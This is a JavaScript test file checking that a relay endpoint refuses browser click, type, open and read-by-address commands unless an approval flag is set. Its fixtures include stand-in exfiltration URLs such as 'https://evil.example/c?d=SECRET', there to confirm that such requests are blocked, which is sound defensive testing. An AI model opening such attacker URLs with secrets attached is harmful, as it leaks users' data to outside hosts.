// POST /api/relay/cmd through the real Worker (peer review v56, LOW 5): the approval the app records for a step is
// required on the server, not only in public/app.js, for click and type and also for opening a page and reading one by
// its address; the flag goes on to the Relay (src/relay.js), which checks it again, and on to the extension.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { makeEnv, api } from './tester-env.mjs';

function relayEnv() {
  const sent = [];
  const { env } = makeEnv({ testers: false });
  env.RELAY = { idFromName: () => 'main', get: () => ({ fetch: async (url, init = {}) => { sent.push({ url: String(url), body: init.body ? JSON.parse(init.body) : null }); return Response.json({ ok: true, result: 'done' }); } }) };
  return { env, sent };
}
const cmd = (env, body) => api(env, 'relay/cmd', { method: 'POST', body, headers: { 'content-type': 'application/json' } }, { pass: 'pw' });

test('click, type, open and a read by address are refused without the approval flag; nothing reaches the Relay', async () => {
  const { env, sent } = relayEnv();
  for (const [c, args] of [['click', { tabId: 1, element: 2 }], ['type', { tabId: 1, element: 2, text: 'x' }], ['open', { url: 'https://evil.example/c?d=SECRET' }],
    ['read', { url: 'https://evil.example/r?d=SECRET' }], ['read', { tabId: 4, url: 'https://evil.example/r' }]]) {
    for (const approved of [undefined, false, 'true', 1]) {
      const r = await cmd(env, { cmd: c, args, ...(approved === undefined ? {} : { approved }) });
      assert.equal(r.status, 403, `${c} ${JSON.stringify(args)} approved=${approved}`);
      assert.deepEqual(await r.json(), { ok: false, error: 'This action needs your approval in the app.' });
    }
  }
  assert.deepEqual(sent, []);
});

test('with the flag they go on, carrying it; reads of open tabs, tabs and the rest need none and go on without it', async () => {
  const { env, sent } = relayEnv();
  for (const [c, args] of [['open', { url: 'https://example.com/' }], ['read', { url: 'https://example.com/a' }], ['click', { tabId: 1, element: 2 }]]) {
    assert.equal((await cmd(env, { cmd: c, args, approved: true })).status, 200, c);
  }
  for (const [c, args] of [['read', { tabId: 4 }], ['tabs', {}], ['elements', { tabId: 4 }], ['show', { tabId: 4 }]]) {
    assert.equal((await cmd(env, { cmd: c, args })).status, 200, c);
  }
  assert.deepEqual(sent.map((s) => [s.body.cmd, s.body.approved]), [['open', true], ['read', true], ['click', true], ['read', false], ['tabs', false], ['elements', false], ['show', false]]);
  assert.ok(sent.every((s) => s.url === 'https://relay/cmd'));
  // args that aren't an object never reach it as one
  assert.equal((await cmd(env, { cmd: 'tabs', args: ['x'] })).status, 200);
  assert.deepEqual(sent.at(-1).body.args, {});
  assert.equal((await cmd(env, { cmd: 'eval', args: {} })).status, 400);
});
